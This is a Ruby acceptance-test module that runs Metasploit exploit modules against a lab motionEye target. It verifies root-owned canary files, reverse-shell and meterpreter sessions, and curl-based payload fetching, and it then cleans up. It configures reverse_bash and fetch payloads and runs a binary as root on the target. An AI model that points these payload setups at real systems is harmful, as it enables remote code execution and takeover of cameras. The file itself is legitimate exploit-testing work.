# frozen_string_literal: true

require_relative '../rsync_creds/native'
require_relative '../inetutils_telnet/prerequisites'
require 'English'

# Native motionEye state, actual owner calls and persisted session evidence.
module MotioneyeTarget
  include RsyncCredentialTarget
  include InetutilsPrerequisites

  CONFIG = JSON.parse(File.read(File.join(__dir__, 'releases.json'))).freeze

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'motioneye.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def rc_command(label, role, *, required: true)
    super(label, role == 'linux' ? 'app' : role, *, required: required)
  end

  def rc_resource_roles
    %w[app reporting_db]
  end

  def me_native(phase)
    output, status = rc_command(phase + '-native', 'app', 'python3', '/opt/module-target/native.py', @profile_name, 'audit', required: false)
    data = JSON.parse(output)
    @rc.fetch(:native) << { phase: phase, data: data }
    rc_save
    expect(status).to eq(0), data.fetch('checks').reject { |row| row.fetch('passed') }.inspect
    expect(data.fetch('checks').length).to eq(16)
    expect(data.fetch('passed')).to be(true)
    data
  end

  def me_snapshot
    output, = rc_command('snapshot', 'app', 'python3', '/opt/module-target/native.py', @profile_name, 'snapshot')
    JSON.parse(output)
  end

  def it_file(path)
    output, = rc_command('proof-file', 'app', 'python3', '/opt/module-target/proof_inspection.py', 'file', path)
    JSON.parse(output)
  end

  def me_process(pid)
    output, = rc_command('callback-process', 'app', 'python3', '/opt/module-target/proof_inspection.py', 'process', pid.to_s)
    JSON.parse(output)
  end

  def me_port
    socket = TCPServer.new(@rc.fetch(:callback).fetch(:bind), 0)
    socket.local_address.ip_port
  ensure
    socket&.close
  end

  def me_tcp(port)
    code = "import json,sys;rows=[line.split()for line in open('/proc/net/tcp').read().splitlines()[1:]];print(json.dumps([{'state':r[3],'uid':int(r[7])}for r in rows if int(r[2].split(':')[1],16)==int(sys.argv[1])]))"
    output, = rc_command('callback-sockets', 'app', 'python3', '-c', code, port.to_s)
    JSON.parse(output)
  end

  def me_call(kind, label, options = {}, action: 'run -z', reuse: false)
    owner = CONFIG.fetch('owners').fetch(kind)
    offset = rc_json('framework.instance_variable_get(:@motioneye_events).length')
    record = { owner: owner, kind: kind, label: label, options: options, action: action }
    @rc.fetch(:calls) << record
    values = {
      'TARGET' => 0, 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => 'true', 'SSL' => false, 'USERNAME' => 'admin', 'PASSWORD' => @profile.fetch('password'),
      'AutoCheck' => true, 'ForceExploit' => false,
      'DisablePayloadHandler' => true, 'WfsDelay' => 0
    }.merge(options)
    values['TARGETURI'] = options.fetch('TARGETURI', '/')
    unless reuse
      console_command('back')
      expect(console_command('use ' + owner)).not_to match(/Failed to load|Unknown command|No results/)
    end
    %w[TARGET PAYLOAD].each { |name| console_command("set #{name} #{values.delete(name)}") }
    command = values.delete('CMD')
    if options.fetch('PAYLOAD', 'cmd/unix/generic') == 'cmd/unix/generic'
      expect(rc_json("begin;active_module.datastore['CMD']=#{command.inspect};active_module.datastore['CMD'];end")).to eq(command)
      record[:configured_command_base64] = Base64.strict_encode64(command.b)
    end
    expect(rc_json("begin;Faker::Config.random=Random.new(#{CONFIG.fetch('faker_loopback_seed')});Faker::Internet.ip_v4_address;end")).to eq(CONFIG.fetch('expected_camera_host'))
    rc_json("begin;Faker::Config.random=Random.new(#{CONFIG.fetch('faker_loopback_seed')});nil;end")
    output = run_target_module(owner, 'app', values, action: action, reuse_module: true, allow_errors: true, command_timeout: 110) do |text|
      record[:output_base64] = Base64.strict_encode64(text.b)
      record[:events] = rc_json("framework.instance_variable_get(:@motioneye_events).drop(#{offset})")
      record[:identity] = rc_json('active_module.object_id')
      record[:command_after_base64] = Base64.strict_encode64(rc_json("active_module.datastore['CMD']").to_s.b) if record[:configured_command_base64]
      rc_save
    end
    expect(output).not_to match(/Unknown datastore option|Error while running command|Call stack:|Parse error:/)
    expect(record[:command_after_base64]).to eq(record[:configured_command_base64]) if record[:configured_command_base64]
    addresses = record.fetch(:events).filter_map do |row|
      next unless row['event'] == 'call' && row['method'] == 'send_signed_request_cgi' && row.fetch('options').fetch('uri').end_with?('/config/add/')

      JSON.parse(row.fetch('options').fetch('data')).fetch('host')
    end
    expect(addresses).to all(eq(CONFIG.fetch('expected_camera_host')))
    [output, record]
  rescue Acceptance::ChildProcessTimeoutError, Acceptance::ChildProcessRecvError
    target_runtime['motioneye_console_failed'] = true
    record[:console_timeout] = true if record
    rc_save
    raise
  end

  def me_check(kind, options = {})
    _output, record = me_call(kind, kind + '-check', options, action: 'check')
    code = record.fetch(:events).reverse.find { |event| event['method'] == 'check' && event['event'] == 'return' }.fetch('check')
    expect(code.fetch('reason')).not_to be_empty
    positive = @profile.fetch(kind) && !options.key?('TARGETURI') && !options.key?('RPORT')
    expect(%w[appears vulnerable].include?(code.fetch('code'))).to eq(positive), code.inspect
    code
  end

  def me_canary(kind, label, options = {}, reuse: false, content: 'motioneye-owner')
    path = "/tmp/module-target-motioneye-owner-#{Process.pid}-#{label}"
    absent_before = !it_file(path).fetch('exists')
    expect(absent_before).to be(true)
    quoted = "'" + content.gsub("'", %q{'"'"'}) + "'"
    command = "printf %s #{quoted} > #{path}"
    output, record = me_call(kind, label, { 'CMD' => command }.merge(options), reuse: reuse)
    positive = @profile.fetch(kind) && options.fetch('TARGETURI', '/') == '/' && !options.key?('RPORT') && options.fetch('USERNAME', 'admin') == 'admin' && options.fetch('PASSWORD', @profile.fetch('password')) == @profile.fetch('password')
    if positive
      rc_poll { it_file(path).fetch('base64') == Base64.strict_encode64(content) }
      expect(it_file(path)).to eq('exists' => true, 'uid' => 0, 'base64' => Base64.strict_encode64(content))
      expect(output).not_to include('Exploit failed', 'Exploit aborted', 'The exploit likely failed')
    else
      expect(it_file(path)).to eq('exists' => false, 'uid' => nil, 'base64' => nil)
      expect(output).to include('Exploit aborted due to failure:')
      expect(output).not_to include('Successfully executed command:')
    end
    record[:proof] = it_file(path)
    rc_save
    record
  ensure
    original_error = $ERROR_INFO
    begin
      if path && absent_before
        rc_command('remove-owner-proof', 'app', 'rm', '-f', path)
        expect(it_file(path).fetch('exists')).to be(false)
      end
      me_restore(record) if record
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      @rc.fetch(:cleanup_errors) << { label: label, type: e.class.name, message: e.message, primary_error: original_error&.message }
      raise unless original_error
    ensure
      rc_save
    end
  end

  def me_session(kind, label, family, reuse: false)
    owner = CONFIG.fetch('owners').fetch(kind)
    payload, type, target = {
      'bash' => ['cmd/unix/reverse_bash', 'shell', 0],
      'fetch-x86' => ['cmd/linux/http/x86/meterpreter_reverse_tcp', 'meterpreter', 0],
      'fetch-x64' => ['cmd/linux/http/x64/meterpreter_reverse_tcp', 'meterpreter', 0],
      'fetch-staged-x64' => ['cmd/linux/http/x64/meterpreter/reverse_tcp', 'meterpreter', 0]
    }.fetch(family)
    callback = @rc.fetch(:callback)
    port = me_port
    positive = @profile.fetch(kind)
    expect(me_tcp(port)).to eq([])
    options = {
      'TARGET' => target, 'PAYLOAD' => payload, 'LHOST' => callback.fetch(:host), 'LPORT' => port,
      'ReverseListenerBindAddress' => callback.fetch(:bind), 'DisablePayloadHandler' => false,
      'AutoCheck' => !reuse, 'WfsDelay' => positive ? 25 : 2
    }
    if family.start_with?('fetch')
      destination = "/tmp/module-target-motioneye-fetch-#{Process.pid}-#{port}"
      options.merge!('FETCH_COMMAND' => 'CURL', 'FETCH_SRVHOST' => callback.fetch(:host), 'FETCH_SRVPORT' => me_port,
                     'FetchListenerBindAddress' => callback.fetch(:bind), 'FETCH_WRITABLE_DIR' => '/tmp',
                     'FETCH_FILENAME' => File.basename(destination), 'FETCH_DELETE' => true)
    end
    output, call = me_call(kind, label, options, reuse: reuse)
    unless positive
      expect(output).to include('Exploit aborted due to failure:')
      expect(rc_json('framework.sessions.keys')).to eq([])
      expect(rc_sql("SELECT count(*) FROM sessions s JOIN hosts h ON h.id=s.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE w.name='#{@workspace}'").strip).to eq('0')
      return
    end
    expect(output).not_to include('Exploit failed', 'Exploit aborted', 'no session was created')
    metadata = rc_poll(45) do
      sessions = rc_json('framework.sessions.map{|id,s|{id:id,type:s.type,owner:s.via_exploit,payload:s.via_payload,db_id:s.db_record&.id}}')
      ready = File.readlines(@observer.fetch('ready_event_path')).map { |line| JSON.parse(line) }
      sessions.find { |row| row.fetch('type') == type && row['db_id'] && ready.any? { |event| event.fetch('id') == row.fetch('id') } }
    end
    expect(metadata.values_at('owner', 'payload')).to eq([owner, 'payload/' + payload])
    identifier = metadata.fetch('id')
    attempt = { label: label, kind: kind, family: family, metadata: metadata, qualified: false }
    @rc.fetch(:session_attempts) << attempt
    rc_save
    proof = "/tmp/module-target-druid-session-#{Process.pid}_#{identifier}-#{identifier}"
    expect(it_file(proof).fetch('exists')).to be(false)
    if type == 'shell'
      result = rc_json("DruidSessionControl.proof(framework,#{identifier},#{proof.inspect})")
      content = 'druid-session'
    else
      channels = rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")
      result = rc_json("begin;s=framework.sessions.fetch(#{identifier});f=nil;begin;f=s.fs.file.new(#{proof.inspect},'wb');f.write('motioneye-session');ensure;f.close if f;end;{id:#{identifier},type:s.type,pid:s.sys.process.getpid,identity:s.sys.config.getuid,api:'fs.file'};end")
      expect(rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")).to eq(channels)
      content = 'motioneye-session'
    end
    expect(result).not_to have_key('error')
    rc_poll { it_file(proof).fetch('base64') == Base64.strict_encode64(content) }
    expect(it_file(proof)).to eq('exists' => true, 'uid' => 0, 'base64' => Base64.strict_encode64(content))
    native = me_process(result.fetch('pid'))
    expect(native).to include('exists' => true, 'uid' => 0)
    expect(me_tcp(port)).to include(include('state' => '01', 'uid' => 0))
    reports = JSON.parse(rc_sql("SELECT coalesce(json_agg(row),'[]'::json) FROM (SELECT s.id,s.stype,s.via_exploit,s.via_payload FROM sessions s JOIN hosts h ON h.id=s.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE w.name='#{@workspace}') row"))
    expect(reports).to include(include('id' => metadata.fetch('db_id'), 'stype' => type, 'via_exploit' => owner, 'via_payload' => 'payload/' + payload))
    record = { label: label, kind: kind, family: family, metadata: metadata, proof: result, native_process: native, reports: reports, port: port }
    unless family == 'bash'
      delivery = call.fetch(:events).select { |event| event.fetch('event') == 'delivery' }.last
      expect(delivery).to include('elf_class' => family == 'fetch-x86' ? 1 : 2, 'sha256' => native.fetch('exe_sha256'))
      record[:delivery] = delivery
    end
    expect(output).not_to include('Exploit failed', 'Exploit aborted', 'The exploit likely failed', 'no session was created')
    @rc.fetch(:sessions) << record
    attempt[:qualified] = true
    rc_save
  ensure
    original_error = $ERROR_INFO
    begin
      unless target_runtime['motioneye_console_failed']
        unless identifier
          # A fixture assertion can fail after a real callback has opened. Close
          # these console-owned sessions without replacing the original failure.
          remaining = rc_json('framework.sessions.keys')
          remaining.each do |session_id|
            rc_json("DruidSessionControl.dispatch(framework,'exit',#{session_id})")
            rc_json("begin;s=framework.sessions[#{session_id}];s.kill if s;{closed:#{session_id}};end")
          end
          @rc.fetch(:interrupted_session_cleanup) << { label: label, ids: remaining } unless remaining.empty?
        end
        if identifier
          rc_command('remove-session-proof', 'app', 'rm', '-f', proof)
          expect(it_file(proof).fetch('exists')).to be(false)
          if rc_json("framework.sessions.key?(#{identifier})")
            cleanup = rc_json("DruidSessionControl.dispatch(framework,'exit',#{identifier})")
            attempt[:cleanup_exit] = cleanup
            expect(cleanup).not_to have_key('error') unless original_error
          end
          rc_json("begin;s=framework.sessions[#{identifier}];s.kill if s;{closed:#{identifier}};end")
          rc_poll { me_tcp(port).none? { |row| %w[01 08].include?(row.fetch('state')) } }
          rc_poll { !me_process(result.fetch('pid')).fetch('exists') } if result && result['pid']
          closed = rc_poll { JSON.parse(rc_sql("SELECT coalesce(json_agg(row),'[]'::json) FROM (SELECT id,closed_at FROM sessions WHERE id=#{metadata.fetch('db_id')}) row")).find { |row| row['closed_at'] } }
          record[:closed_report] = closed if record
          attempt[:closed_report] = closed
        end
        rc_poll { !it_file(destination).fetch('exists') } if destination
        console_command('jobs -K')
        expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
      end
      me_restore(call) if call
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      @rc.fetch(:cleanup_errors) << { label: label, type: e.class.name, message: e.message, primary_error: original_error&.message }
      rc_save
      raise unless original_error
    end
    rc_save
  end

  # Camera configuration cleanup belongs to the owner. Saved image directories
  # remain application data; remove only paths observed in this test's requests.
  def me_restore(call)
    paths = call.fetch(:events).filter_map do |row|
      next unless row['event'] == 'call' && row['method'] == 'send_signed_request_cgi'

      options = row.fetch('options')
      next unless options.fetch('uri').end_with?('/config/0/set/')

      JSON.parse(options.fetch('data')).values.filter_map { |camera| camera['root_directory'] }
    end.flatten
    paths.concat(call.fetch(:events).filter_map do |row|
      next unless row['event'] == 'return' && row['method'] == 'send_signed_request_cgi' && row['response']

      body = JSON.parse(Base64.strict_decode64(row.fetch('response').fetch('body_base64')))
      body['root_directory'] if body.is_a?(Hash)
    end)
    paths.uniq!
    expect(paths.map { |path| File.basename(path) } & @baseline.fetch('media_roots')).to eq([])
    output, = rc_command('operator-media-cleanup', 'app', 'python3', '/opt/module-target/native.py', @profile_name, 'cleanup-media', JSON.generate(paths))
    records = JSON.parse(output)
    @rc.fetch(:operator_media_cleanup).concat(records)
    expect(records).to all(include('absent' => true))
    rc_poll { me_snapshot == @baseline }
    rc_save
  end

  def me_native_x86
    executable = File.join(target_runtime.fetch('artifacts'), 'native-exit32')
    args = ['nasm', '-f', 'bin', '-DARCH=32', 'test/module_targets/druid_sessions/native_exit.asm', '-o', executable]
    output, status = Open3.capture2e(*args)
    expect(status.success?).to be(true), output
    bytes = File.binread(executable)
    expect(bytes.byteslice(0, 5)).to eq("\x7fELF\x01".b)
    code = "import base64,hashlib,json,os,subprocess,sys;from pathlib import Path;p=Path('/tmp/module-target-motioneye-native32');assert not p.exists();p.write_bytes(base64.b64decode(sys.argv[1]));p.chmod(0o755)\ntry:r=subprocess.run([str(p)],timeout=5);print(json.dumps({'exit':r.returncode,'uid':os.geteuid(),'sha256':hashlib.sha256(p.read_bytes()).hexdigest()}))\nfinally:p.unlink()"
    output, = rc_command('native-x86-execute', 'app', 'python3', '-c', code, Base64.strict_encode64(bytes))
    @rc[:native_x86] = JSON.parse(output)
    rc_save
    expect(@rc[:native_x86]).to eq('exit' => 42, 'uid' => 0, 'sha256' => Digest::SHA256.hexdigest(bytes))
  end
end
